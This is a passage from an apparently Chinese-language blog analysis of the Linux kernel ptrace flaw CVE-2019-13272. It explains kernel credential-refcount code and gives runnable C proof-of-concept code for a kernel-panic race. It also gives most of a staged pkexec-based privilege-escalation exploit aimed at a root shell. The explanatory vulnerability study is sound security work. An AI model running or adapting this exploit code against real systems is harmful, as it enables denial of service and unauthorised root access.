*new)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> *<span class="hljs-title">task</span> =</span> current;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">old</span> =</span> task-&gt;real_cred;<br>    <br>    <span class="hljs-comment">//...</span><br>    <br>    <span class="hljs-comment">/* release the old obj and subj refs both */</span><br>put_cred(old);<br>put_cred(old);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在该函数末尾会两次调用 <code>put_cred()</code> 函数，该函数定义于 <code>/include/linux/cred.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">put_cred</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> cred *_cred)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">cred</span> =</span> (<span class="hljs-keyword">struct</span> cred *) _cred;<br><br>validate_creds(cred);<br><span class="hljs-keyword">if</span> (atomic_dec_and_test(&amp;(cred)-&gt;usage))<br>__put_cred(cred);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到其功能比较简单，一是调用 <code>validate_cred()</code> 验证 cred 是否合法，随后使用 <code>atomic_dec_and_test</code> 宏将 cred 的引用计数减一，并确认其引用计数是否为 0，若为 0 则调用 <code>__put_cred()</code></p><p>通常来说，在 commit_creds 两次减去引用计数（cred 一次，real_cred 一次）后最终执行流都会走到 <code>__put_cred()</code>，该函数定义于 <code>/kernel/cred.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * __put_cred - Destroy a set of credentials</span><br><span class="hljs-comment"> * @cred: The record to release</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Destroy a set of credentials on which no references remain.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> __put_cred(<span class="hljs-keyword">struct</span> cred *cred)<br>&#123;<br>kdebug(<span class="hljs-string">&quot;__put_cred(%p&#123;%d,%d&#125;)&quot;</span>, cred,<br>       <span class="hljs-type">atomic_read</span>(&amp;cred-&gt;usage),<br>       read_cred_subscribers(cred));<br><br>BUG_ON(<span class="hljs-type">atomic_read</span>(&amp;cred-&gt;usage) != <span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span><br>BUG_ON(read_cred_subscribers(cred) != <span class="hljs-number">0</span>);<br>cred-&gt;magic = CRED_MAGIC_DEAD;<br>cred-&gt;put_addr = __builtin_return_address(<span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>BUG_ON(cred == current-&gt;cred);<br>BUG_ON(cred == current-&gt;real_cred);<br><br>call_rcu(&amp;cred-&gt;rcu, put_cred_rcu);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们看到其一开始先验证 cred 的引用计数，随后调用 <code>call_rcu()</code>，该函数的作用可以简单理解为在 rcu 机制下调用函数指针，这里调用的是 <code>put_cred_rcu()</code> 函数，定义于 <code>/kernel/cred.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The RCU callback to actually dispose of a set of credentials</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">put_cred_rcu</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> rcu_head *rcu)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">cred</span> =</span> container_of(rcu, <span class="hljs-keyword">struct</span> cred, rcu);<br><br>kdebug(<span class="hljs-string">&quot;put_cred_rcu(%p)&quot;</span>, cred);<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span><br><span class="hljs-keyword">if</span> (cred-&gt;magic != CRED_MAGIC_DEAD ||<br>    <span class="hljs-type">atomic_read</span>(&amp;cred-&gt;usage) != <span class="hljs-number">0</span> ||<br>    read_cred_subscribers(cred) != <span class="hljs-number">0</span>)<br>panic(<span class="hljs-string">&quot;CRED: put_cred_rcu() sees %p with&quot;</span><br>      <span class="hljs-string">&quot; mag %x, put %p, usage %d, subscr %d\n&quot;</span>,<br>      cred, cred-&gt;magic, cred-&gt;put_addr,<br>      <span class="hljs-type">atomic_read</span>(&amp;cred-&gt;usage),<br>      read_cred_subscribers(cred));<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-keyword">if</span> (<span class="hljs-type">atomic_read</span>(&amp;cred-&gt;usage) != <span class="hljs-number">0</span>)<br>panic(<span class="hljs-string">&quot;CRED: put_cred_rcu() sees %p with usage %d\n&quot;</span>,<br>      cred, <span class="hljs-type">atomic_read</span>(&amp;cred-&gt;usage));<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>security_cred_free(cred);<br>key_put(cred-&gt;session_keyring);<br>key_put(cred-&gt;process_keyring);<br>key_put(cred-&gt;thread_keyring);<br>key_put(cred-&gt;request_key_auth);<br><span class="hljs-keyword">if</span> (cred-&gt;group_info)<br>put_group_info(cred-&gt;group_info);<br>free_uid(cred-&gt;user);<br>put_user_ns(cred-&gt;user_ns);<br>kmem_cache_free(cred_jar, cred);<br>&#125;<br></code></pre></td></tr></table></figure><p>可见其会判断 cred 的引用计数是否为 0，<strong>若不为 0 则会导致 kernel panic</strong>，在正常情况下则是常规的将 cred 释放回 cred_jar 这一 slub 的流程</p><p>看起来好像没什么问题，在进入释放函数前已有一次检查，想必没有可能引起 kernel panic，<strong>实则不然</strong>，我们考虑如下竞态场景：</p><ul><li>父进程不断地更新自身 cred</li><li>子进程不断地调用 <code>ptrace(PTRACE_TRACEME, 0, NULL, NULL)</code></li></ul><p>在这种场景下，若是父进程在更新自身 cred 时，在父进程替换自身 cred 之前子进程获取到了父进程的旧 cred，在父进程进入到 <code>put_cred_rcu</code> 函数之后子进程刚好才将旧 cred 的引用计数 +1，此时便<strong>无法通过释放函数中的引用计数检查，从而造成 kernel panic</strong></p><h2 id="ptracer-cred-设置的逻辑错误导致本地提权">ptracer_cred 设置的逻辑错误导致本地提权</h2><p>这个逻辑漏洞的利用在笔者看来<strong>十分巧妙</strong>，在正常情况下普通权限的 ptracer 确乎是无法调试执行 suid 程序的 pracee 的，但是 Jann Horn 提出了一个十分巧妙的<strong>多级 ptrace 方案</strong></p><p>我们现在来考虑如下场景：</p><ul><li>进程 A fork 出子进程 B</li><li>进程 B fork 出子进程 C</li><li>进程 B 执行一个<strong>先提权后降权的</strong> suid 程序</li><li>进程 C 检测到进程 B 提权后发起 <code>PTRACE_RTRACEME</code> 请求，随后执行一个 suid 程序，此时因为进程 B 已经提权所以 ptrace link 建立成功，<strong>此时进程 C 为 root 权限</strong></li><li>进程 A 检测到进程 B 执行 suid 程序后，主动 ptrace attach 进程 B</li><li>此时<strong>进程 B 已经完成降权，故进程 A 可以 ptrace 进程 B，而进程 B 已经与进程 C 建立了 ptrace link，此时进程 C 在判断进程 B 权限时使用的是此前保存的 root cred，故进程 B 可以 ptrace 进程 C 让其在 root 权限下执行恶意代码</strong></li></ul><p>听起来似乎需要一些条件竞争？而且我们似乎很难找到这样一个 suid 程序，<strong>这令这个漏洞变得十分的鸡肋</strong>，我们只能在一些特定发行版下完成利用</p><h1>0x02.漏洞利用</h1><h2 id="利用竞态条件造成-kernel-panic">利用竞态条件造成 kernel panic</h2><p>前面我们已经讲到开两个进程进行竞争便能触发 kernel panic，而合法更新父进程的 cred 的方式有很多，例如 <code>setresuid</code> 这一系列的系统调用便能合法更新进程的 cred，这里我们便选用 setresuid 系统调用</p><p>exp 如下，这里参考了 jannh 给出的 poc：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">ptraceThread</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span><br>&#123;<br>    ptrace(PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">pthread_t</span> child;<br>    <span class="hljs-type">int</span> uid;<br>    <span class="hljs-type">int</span> pid;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] CVE-2019-13272 POC of kernel panic.&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Written by arttnba3.&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Start exploiting...&quot;</span>);<br><br>    uid = getuid();<br>    pid = fork();<br>    <span class="hljs-keyword">if</span> (pid != <span class="hljs-number">0</span>) <span class="hljs-comment">// parent</span><br>    &#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>        &#123;<br>            setresuid(uid, uid, uid);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-comment">// child</span><br>    &#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>        &#123;<br>            pthread_create(&amp;child, <span class="hljs-literal">NULL</span>, ptraceThread, <span class="hljs-literal">NULL</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://s2.loli.net/2022/01/14/Cl1RPwcj5s8OLrf.png" alt="image.png"></p><p>可以看到的是我们成功利用该漏洞造成了 kernel panic</p><h2 id="利用逻辑错误进行本地提权">利用逻辑错误进行本地提权</h2><p>我们先介绍一个新玩意——<code>PolKit</code>，这是一个应用程序框架，相比起 sudo 等传统特权授权程序，polkit 可以进行更细粒度的权限授予，这里不深入研究其用法</p><p>接下来我们需要用到一个大部分 Linux 桌面发行版都有的 suid 程序—— <code>pkexec</code>，这是 polkit 中的工具之一，其允许获得授权的用户以另一用户的身份执行特定程序，如下是我们将会用到的指令执行格式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pkexec -user username some_programme_under_polkit</span><br></code></pre></td></tr></table></figure><p>当我们使用 <code>-user</code> 参数时， pkexec 会<strong>先将进程提权到 root，之后再降权到指定用户</strong>，这恰好可以用来构造我们 ptrace 利用链上的进程 B</p><p>此外，我们需要执行一个<strong>在 polkit 框架下运行的可执行程序</strong>（Jann Horn 称之为 helper），helper 需要满足的是<strong>普通用户执行时不需要认证</strong>（很多 polkit 程序执行时都需要弹窗认证）</p><p>接下来我们解决利用流程中条件竞争的问题，这里我们可以使用_管道_来控制程序执行的时机，从而让对应的三个进程能够在对应时机执行对应操作</p><p>下面我们分阶段对 exp 进行讲解，这里的 exp 笔者参考了 Jann 的exp 进行重新编写，经过笔者的一些<s>自以为是的</s>优化</p><h3 id="Setp-I-task-A-fork-task-B">Setp.I task A fork task B</h3><p>这里的 main 函数笔者设计为主要实现 task A 的功能，同时也作为后面 task B 与 task C 通过 execveat 替换自身镜像时的跳转入口</p><p>findHelper() 用以寻找当前平台可用的 helper，不再赘叙</p><p>task A 首先需要创建一个管道，后面我们需要将 task B 的 stdout 重定向至该管道以让其堵塞，因此我们需要将管道设为 <code>O_DIRECT</code> 模式，这意味着该管道传输数据的方式是按 “packet” 进行传输的，随后我们先往其中填充一个 packet，后面 task B 在写入  stdout 时便会堵塞（为什么要阻塞后面细说）</p><p>创建完成管道之后便 fork 出 task B，接下来我们来看 task B 的流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;stage2&quot;</span>))<br>        <span class="hljs-keyword">return</span> middleStage();<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;stage3&quot;</span>))<br>        <span class="hljs-keyword">return</span> getRootShell();<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] CVE-2019-13272 POC of local privileged.&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Written by arttnba3.&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Start exploiting...&quot;</span>);<br><br>    <span class="hljs-comment">// find the helper</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Finding the helper...&quot;</span>);<br>    helper = findHelper();<br>    helper_basename = basename(helper);<br>    <span class="hljs-keyword">if</span> (!helper)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[x] Unable to find suitable helper on your platform!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Using helper: %s\n&quot;</span>, helper);<br><br>    <span class="hljs-comment">// create the pipe for blocking child</span><br>    pipe2(pipe_for_block, O_DIRECT | O_CLOEXEC); <span class="hljs-comment">// set the pipe in packet mode, which meant that the data should be received in packets</span><br>    fcntl(pipe_for_block[<span class="hljs-number">0</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span>);<br>    write(pipe_for_block[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>); <span class="hljs-comment">// temp packet to make the following ones stuck, the stdout of task B will be redirect to it</span><br><br>    <span class="hljs-comment">// fork out task B</span><br>    <span class="hljs-comment">// two kinds of writing, all OK</span><br>    <span class="hljs-comment">// pid_task_b = clone(middlePtracee, (size_t)malloc(0x1000 * 100) + 0x1000 * 100, CLONE_VM | CLONE_VFORK | SIGCHLD, NULL);</span><br>    pid_task_b = fork();<br>    <span class="hljs-keyword">if</span> (!pid_task_b)<br>    &#123;<br>        middlePtracee();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">// ...</span><br></code></pre></td></tr></table></figure><h3 id="Step-II-task-B-fork-task-C">Step.II task B fork task C</h3><p>task B 主要的工作笔者都将其封装在 <code>middlePtracee()</code> 中，首先还是 fork 出 task C，<strong>此时 task A 与 task C 都在监视 task B 的状态</strong></p><p>接下来 task B 将自身的 stdin 重定向自 <code>/proc/self/exe</code> ，<strong>将 stdout 重定向至阻塞的管道</strong>，这是因为在接下来我们执行 pkexec 时，pkexec 的输出走 stderr，因此提权-&gt;降权这一流程并不会阻塞，而 pkexec 执行的 helper 的输出则走 stdout，<strong>此时程序会阻塞在这里，且 task B 已经降权，因此 task A 可以借此时机接管 task B</strong></p><p>重定向完成后便是常规的执行 <code>pkexec</code> 的流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// task B</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">middlePtracee</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    self_fd = open(<span class="hljs-string">&quot;/proc/self/exe&quot;</span>, O_RDONLY);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">passwd</span> *<span class="hljs-title">pw</span> =</span> getpwuid(getuid());<br>    pid_task_b = getpid();<br><br>    pid_task_c = fork();<br>    <span class="hljs-keyword">if</span> (!pid_task_c)<br>        <span class="hljs-keyword">return</span> finalPtracee();<br>    <br>    <span class="hljs-built_in">fputs</span>(<span class="hljs-string">&quot;[+] Task B fork out task C.\n&quot;</span>, <span class="hljs-built_in">stderr</span>);<br>    <span class="hljs-built_in">fputs</span>(<span class="hljs-string">&quot;[*] Task B execve pkexec soooon...\n&quot;</span>, <span class="hljs-built_in">stderr</span>);<br>    dup2(self_fd, <span class="hljs-number">0</span>); <span class="hljs-comment">// got stdin close</span><br>    dup2(pipe_for_block[<span class="hljs-number">1</span>], <span class="hljs-number">1</span>); <span class="hljs-comment">// redirect stdout to block it</span><br>    execl(<span class="hljs-string">&quot;/usr/bin/pkexec&quot;</span>, basename(<span class="hljs-string">&quot;/usr/bin/pkexec&quot;</span>), <span class="hljs-string">&quot;--user&quot;</span>, pw-&gt;pw_name, helper, <span class="hljs-string">&quot;--helper&quot;</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// if we arrive there, we failed.</span><br>    <span class="hljs-built_in">fputs</span>(<span class="hljs-string">&quot;[x] Failed to execve pkexec!&quot;</span>, <span class="hljs-built_in">stderr</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-III-task-C-get-root">Step.III task C get root</h3><p>task B 执行 pkexec 之后会提权到 root，当 task C 监视到 task B 执行 pkexec 后便调用 <code>ptrace(PTRACE_TRACEME, 0, NULL, NULL)</code> 来获取 task B 的 root cred，<strong>从而令 task C 的 ptracer_cred 为 root cred</strong>，此时 task C 再执行一个 suid 程序便能以 root 权限执行，<strong>且仍保持着被 task B ptrace 的状态</strong></p><p>这里我们选择执行 <code>/usr/bin/passwd</code>，因为其会等待用户输入而不会直接退出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// task C</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">finalPtracee</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    pid_task_c = getpid();<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">char</span> needle[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">char</span> uid_buf[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> task_B_status_fd;<br><br>    <span class="hljs-built_in">sprintf</span>(needle, <span class="hljs-string">&quot;/proc/%d/status&quot;</span>, pid_task_b);<br>    <span class="hljs-built_in">sprintf</span>(uid_buf, <span class="hljs-string">&quot;Uid:\t%d\t0\t&quot;</span>, getuid());<br>    dup2(self_fd, <span class="hljs-number">114</span>);<br>    task_B_status_fd = open(needle, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (task_B_status_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fputs</span>(<span class="hljs-string">&quot;[x] Failed to get status of task B!&quot;</span>, <span class="hljs-built_in">stderr</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">// check out uid of task B</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        buf[pread(task_B_status_fd, buf, <span class="hljs-number">0x1000</span> - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(buf, uid_buf)) <span class="hljs-comment">// task B got root</span><br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// let task B(root) be ptracer</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Task B is root now!&quot;</span>);<br>    ptrace(PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Task C execve another suid programme sooooon...&quot;</span>);<br>    execl(<span class="hljs-string">&quot;/usr/bin/passwd&quot;</span>, <span class="hljs-string">&quot;passwd&quot;</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// if we arrived there, execve failed </span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] Task C failed to execve!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-IV-task-A-attach-task-B">Step.IV task A attach task B</h3><p>task A 在 fork 出 task B 之后便持续监视 task B 的状态，当 task B 执行 helper 时<strong>说明 task B 已经降权并阻塞，此时 task A 便有足够的权限 ptrace task B</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//...</span><br><br><span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;/proc/%d/comm&quot;</span>, pid_task_b);<br>   <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>   &#123;<br>       <span class="hljs-type">char</span> comm[<span class="hljs-number">0x100</span>];<br>       <span class="hljs-type">int</span> comm_fd = open(buf, O_RDONLY);<br>       <span class="hljs-keyword">if</span> (comm_fd &lt; <span class="hljs-number">0</span>)<br>       &#123;<br>           <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[x] Failed to read comm of task B!\n&quot;</span>);<br>           <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>       &#125;<br>       comm[read(comm_fd, comm, <span class="hljs-number">0x100</span> - <span class="hljs-number">1</span>)] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>       <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(comm, helper_basename, <span class="hljs-number">10</span>))<br>           <span class="hljs-keyword">break</span>;<br>       usleep(<span class="hljs-number">100000</span>);<br>   &#125;<br><br>   <span class="hljs-comment">// task B got the root, wait a while it&#x27;ll lose privilege, then task A attach to it</span><br>   <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Task A attaching to task B soooon...&quot;</span>);<br>   ptrace(PTRACE_ATTACH, pid_task_b, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>   waitpid(pid_task_b, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// 0 means no extra options</span><br><br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><h3 id="Step-V-get-privileged-by-multistage-ptrace-link">Step.V get privileged by multistage ptrace link</h3><p>当程序运行到这一步时，<strong>我们已经成功建立了</strong> <code>task A -&gt; task B -&gt; task C</code> <strong>这一多级 ptrace 链条</strong>，此时 task A、B 为用户权限，task C 为 root 权限，<strong>而 task C 保存的 ptracer_cred 同为 root 权限</strong>，因此我们可以通过 task A 控制 task B 控制 task C 来完成提权</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 